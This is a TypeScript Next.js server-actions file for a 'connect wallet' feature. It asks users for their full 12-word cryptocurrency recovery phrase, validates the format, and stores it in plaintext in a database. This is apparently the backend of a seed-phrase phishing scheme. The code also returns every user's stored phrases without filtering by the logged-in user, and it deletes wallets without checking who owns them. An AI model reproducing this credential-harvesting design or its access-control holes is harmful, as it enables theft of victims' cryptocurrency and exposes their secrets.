/* eslint-disable @typescript-eslint/no-explicit-any */
'use server'

import { supabase } from '@/lib/supabaseClient'
import { cookies } from 'next/headers'

interface Wallet {
  id: string
  wallet_provider: string
  secret_phrase: string
  created_at: string
  is_primary: boolean
}

interface ActionResult {
  success?: boolean
  error?: string | null
  data?: any
  walletId?: string | null
  walletProvider?: string | null
}

// Get all wallets for the current user
export async function getAllUserWallets(): Promise<ActionResult> {
  try {
    const cookieStore =await cookies()
    const userId = cookieStore.get('user_id')?.value

    if (!userId) {
      return { error: 'Not authenticated. Please log in again.' }
    }

    const { data: wallets, error } = await supabase
      .from('user_wallets')
      .select('id, wallet_provider, secret_phrase, created_at, is_primary')
      .order('created_at', { ascending: false })

    if (error) {
      console.error('Error fetching wallets:', error)
      return { error: 'Failed to fetch wallets' }
    }

    return {
      success: true,
      data: wallets as Wallet[]
    }
  } catch (err) {
    console.error('Unexpected error in getAllUserWallets:', err)
    return { error: 'An unexpected error occurred' }
  }
}

// Connect a new wallet
export async function connectWallet(
  prevState: ActionResult | null,
  formData: FormData
): Promise<ActionResult> {
  try {
    const walletProvider = formData.get('walletProvider') as string
    const secretPhraseInput = formData.get('secretPhrase') as string | undefined

    // 1. Get user_id from cookies
    const cookieStore =await cookies()
    const userId = cookieStore.get('user_id')?.value

    if (!userId) {
      return { error: 'Not authenticated. Please log in again.' }
    }

    // 2. Validate wallet provider
    if (!walletProvider || walletProvider.trim().length < 2) {
      return { error: 'Please provide your wallet provider name (e.g., Trust Wallet, Binance)' }
    }

    // 3. Validate secret phrase format (must be 12 words with numbers)
    if (!secretPhraseInput) {
      return { error: 'Secret phrase is required' }
    }

    const secretPhraseParts = secretPhraseInput.split(',')
    
    // Check we have exactly 12 parts
    if (secretPhraseParts.length !== 12) {
      return { error: 'Secret phrase must contain exactly 12 comma-separated items (e.g., "1 word1,2 word2,...12 word12")' }
    }
    
    // Validate each part has the correct format (number word)
    for (let i = 0; i < secretPhraseParts.length; i++) {
      const part = secretPhraseParts[i].trim()
      const spaceIndex = part.indexOf(' ')
      
      if (spaceIndex === -1) {
        return { error: `Each secret phrase item must include a number and word (e.g., "1 word1"). Problem with item ${i+1}` }
      }
      
      const numberPart = part.substring(0, spaceIndex)
      const wordPart = part.substring(spaceIndex + 1)
      
      if (isNaN(Number(numberPart))) {
        return { error: `First part of each secret phrase item must be a number (e.g., "1 word1"). Problem with item ${i+1}` }
      }
      
      if (Number(numberPart) !== i + 1) {
        return { error: `Secret phrase items must be numbered sequentially from 1 to 12. Found ${numberPart} when expecting ${i+1}` }
      }
      
      if (!wordPart.trim()) {
        return { error: `Each secret phrase item must include a word after the number (e.g., "1 word1"). Problem with item ${i+1}` }
      }
    }

    // 4. Create wallet connection record
    const { data: wallet, error: insertError } = await supabase
      .from('user_wallets')
      .insert([{
        user_id: userId,
        wallet_provider: walletProvider.trim(),
        secret_phrase: secretPhraseInput,
        is_primary: false,
        created_at: new Date().toISOString()
      }])
      .select()
      .single()

    if (insertError || !wallet) {
      console.error('Wallet connection failed:', insertError)
      return { error: 'Failed to connect wallet' }
    }

    return { 
      success: true,
      walletId: wallet.id,
      walletProvider: wallet.wallet_provider
    }

  } catch (err) {
    console.error('Unexpected error in connectWallet:', err)
    return { error: 'An unexpected error occurred. Please try again.' }
  }
}

// Delete a wallet
export async function deleteUserWallet(walletId: string): Promise<ActionResult> {
  try {
    const cookieStore =await cookies()
    const userId = cookieStore.get('user_id')?.value

    if (!userId) {
      return { error: 'Not authenticated. Please log in again.' }
    }
 

    const { error: deleteError } = await supabase
      .from('user_wallets')
      .delete()
      .eq('id', walletId)

    if (deleteError) {
      console.error('Error deleting wallet:', deleteError)
      return { error: 'Failed to delete wallet' }
    }

    return { success: true }
  } catch (err) {
    console.error('Unexpected error in deleteUserWallet:', err)
    return { error: 'An unexpected error occurred while deleting wallet' }
  }
}